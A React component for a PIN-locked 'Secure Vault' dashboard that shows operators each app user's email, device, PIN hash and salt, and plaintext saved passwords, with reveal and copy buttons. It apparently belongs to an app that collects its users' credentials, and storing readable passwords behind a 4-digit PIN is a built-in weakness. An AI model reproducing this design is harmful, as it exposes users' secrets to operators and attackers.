import { useState, useEffect, useRef } from "react";
import { Shield, Lock, Eye, EyeOff, Copy, Key, User, Smartphone, HardDrive } from "lucide-react";

interface VaultUser {
  id: string;
  email: string;
  name: string;
  deviceModel: string;
  osVersion: string;
  protectionActive: boolean;
  lastActive: string;
  pinHash: string;
  pinSalt: string;
  savedPasswords: string[];
}

export default function VaultView() {
  const [pin, setPin] = useState(["", "", "", ""]);
  const [locked, setLocked] = useState(true);
  const [error, setError] = useState("");
  const [users, setUsers] = useState<VaultUser[]>([]);
  const [loading, setLoading] = useState(false);
  const [revealedRows, setRevealedRows] = useState<Set<string>>(new Set());
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const handleDigit = (idx: number, val: string) => {
    if (val.length > 1) return;
    const next = [...pin];
    next[idx] = val;
    setPin(next);
    setError("");
    if (val && idx < 3) {
      inputRefs.current[idx + 1]?.focus();
    }
    if (idx === 3 && val) {
      setTimeout(() => verifyPin([...next.slice(0, 3), val].join("")), 100);
    }
  };

  const handleKeyDown = (idx: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace") {
      if (pin[idx]) {
        const next = [...pin];
        next[idx] = "";
        setPin(next);
      } else if (idx > 0) {
        const next = [...pin];
        next[idx - 1] = "";
        setPin(next);
        inputRefs.current[idx - 1]?.focus();
      }
    }
  };

  const verifyPin = async (fullPin: string) => {
    setLoading(true);
    try {
      const res = await fetch("/api/vault/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: fullPin })
      });
      const data = await res.json();
      if (data.verified) {
        setLocked(false);
        fetchData();
      } else {
        setError("Invalid vault PIN");
        setPin(["", "", "", ""]);
        inputRefs.current[0]?.focus();
      }
    } catch {
      setError("Connection error");
    } finally {
      setLoading(false);
    }
  };

  const fetchData = async () => {
    try {
      const res = await fetch("/api/vault/data");
      const data = await res.json();
      setUsers(data.users || []);
    } catch {
      setError("Failed to load vault data");
    }
  };

  useEffect(() => {
    if (!locked) {
      pollRef.current = setInterval(fetchData, 15000);
    }
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [locked]);

  const toggleReveal = (id: string) => {
    setRevealedRows(prev => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (locked) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh]">
        <div className="bg-[#131127] border border-[#252243] rounded-2xl p-10 w-full max-w-md">
          <div className="flex flex-col items-center gap-4 mb-8">
            <div className="w-16 h-16 rounded-2xl bg-[#6122e6]/20 border border-[#6122e6]/30 flex items-center justify-center">
              <Lock className="w-8 h-8 text-[#ffea2a]" />
            </div>
            <h2 className="text-xl font-bold text-white">Secure Vault</h2>
            <p className="text-sm text-[#8e8a9f] text-center">Enter vault PIN to access sensitive user data</p>
          </div>

          <div className="flex justify-center gap-3 mb-6">
            {pin.map((d, i) => (
              <input
                key={i}
                ref={el => { inputRefs.current[i] = el; }}
                type="password"
                maxLength={1}
                value={d}
                onChange={e => handleDigit(i, e.target.value)}
                onKeyDown={e => handleKeyDown(i, e)}
                className="w-12 h-14 bg-[#0c0b18] border border-[#252243] rounded-xl text-center text-xl text-white font-mono outline-none focus:border-[#6122e6] focus:ring-1 focus:ring-[#6122e6]/50 placeholder-[#3a3555]"
                placeholder="•"
              />
            ))}
          </div>

          {error && <p className="text-[#fc2e5c] text-xs text-center mb-4">{error}</p>}

          <button
            onClick={() => verifyPin(pin.join(""))}
            disabled={loading || pin.some(d => !d)}
            className="w-full py-3 rounded-xl bg-[#6122e6] hover:bg-[#7c3aed] disabled:opacity-40 text-white font-semibold text-sm transition-all"
          >
            {loading ? "Verifying..." : "Unlock Vault"}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-lg font-bold text-white flex items-center gap-2">
            <Lock className="w-5 h-5 text-[#ffea2a]" />
            Secure Vault
          </h2>
          <p className="text-xs text-[#8e8a9f] mt-1">Sensitive user credentials, locations & stored data</p>
        </div>
        <button
          onClick={() => { setLocked(true); setPin(["", "", "", ""]); setRevealedRows(new Set()); }}
          className="px-4 py-2 rounded-xl border border-[#fc2e5c]/20 bg-[#fc2e5c]/5 text-[#ff8ba4] hover:bg-[#fc2e5c]/15 text-xs font-semibold transition-all"
        >
          Lock Vault
        </button>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full text-left">
          <thead>
                <tr className="border-b border-[#1e1c31]">
                  <th className="py-3 px-3 text-[10px] font-semibold uppercase tracking-wider text-[#8e8a9f]">User</th>
                  <th className="py-3 px-3 text-[10px] font-semibold uppercase tracking-wider text-[#8e8a9f]">Device</th>
                  <th className="py-3 px-3 text-[10px] font-semibold uppercase tracking-wider text-[#8e8a9f]">PIN Hash / Salt</th>
                  <th className="py-3 px-3 text-[10px] font-semibold uppercase tracking-wider text-[#8e8a9f]">Saved Passwords</th>
                  <th className="py-3 px-3 text-[10px] font-semibold uppercase tracking-wider text-[#8e8a9f]">Last Active</th>
                  <th className="py-3 px-3 w-10" />
                </tr>
          </thead>
          <tbody>
            {users.map(u => {
              const revealed = revealedRows.has(u.id);
              return (
                <tr key={u.id} className="border-b border-[#1e1c31]/50 hover:bg-[#131127]/50 transition-colors">
                  <td className="py-3 px-3">
                    <div className="flex items-center gap-2">
                      <User className="w-3.5 h-3.5 text-[#8e8a9f]" />
                      <div>
                        <p className="text-sm text-white font-medium">{u.name}</p>
                        <p className="text-[10px] text-[#8e8a9f]">{u.email}</p>
                      </div>
                    </div>
                  </td>
                  <td className="py-3 px-3">
                    <div className="flex items-center gap-2">
                      <Smartphone className="w-3.5 h-3.5 text-[#8e8a9f]" />
                      <div>
                        <p className="text-xs text-white">{u.deviceModel}</p>
                        <p className="text-[10px] text-[#8e8a9f]">{u.osVersion}</p>
                      </div>
                    </div>
                  </td>
                  <td className="py-3 px-3">
                    {revealed ? (
                      <div className="space-y-1">
                        <div className="flex items-center gap-1.5">
                          <Key className="w-3 h-3 text-[#ffea2a]" />
                          <span className="text-xs text-white font-mono break-all">{u.pinHash}</span>
                          <button onClick={() => copyToClipboard(u.pinHash)} className="text-[#8e8a9f] hover:text-white transition-colors shrink-0">
                            <Copy className="w-3 h-3" />
                          </button>
                        </div>
                        <div className="flex items-center gap-1.5">
                          <HardDrive className="w-3 h-3 text-[#ffea2a]" />
                          <span className="text-xs text-white font-mono break-all">{u.pinSalt}</span>
                        </div>
                      </div>
                    ) : (
                      <span className="text-xs text-[#8e8a9f]">● ● ● ● ● ● ● ●</span>
                    )}
                  </td>
                  <td className="py-3 px-3">
                    {revealed && u.savedPasswords.length > 0 ? (
                      <div className="space-y-1">
                        {u.savedPasswords.map((pw, i) => (
                          <div key={i} className="flex items-center gap-1.5">
                            <Key className="w-3 h-3 text-[#ffea2a]" />
                            <span className="text-xs text-white font-mono">{pw}</span>
                            <button onClick={() => copyToClipboard(pw)} className="text-[#8e8a9f] hover:text-white transition-colors shrink-0">
                              <Copy className="w-3 h-3" />
                            </button>
                          </div>
                        ))}
                      </div>
                    ) : revealed ? (
                      <span className="text-xs text-[#8e8a9f]">None saved</span>
                    ) : (
                      <span className="text-xs text-[#8e8a9f]">● ● ● ● ● ● ● ●</span>
                    )}
                  </td>
                  <td className="py-3 px-3">
                    <span className="text-xs text-white">{u.lastActive}</span>
                  </td>
                  <td className="py-3 px-3">
                    <button
                      onClick={() => toggleReveal(u.id)}
                      className="text-[#8e8a9f] hover:text-[#ffea2a] transition-colors"
                      title={revealed ? "Hide secrets" : "Reveal secrets"}
                    >
                      {revealed ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </td>
                </tr>
              );
            })}
            {users.length === 0 && (
              <tr>
                <td colSpan={6} className="py-8 text-center text-sm text-[#8e8a9f]">No user data available</td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
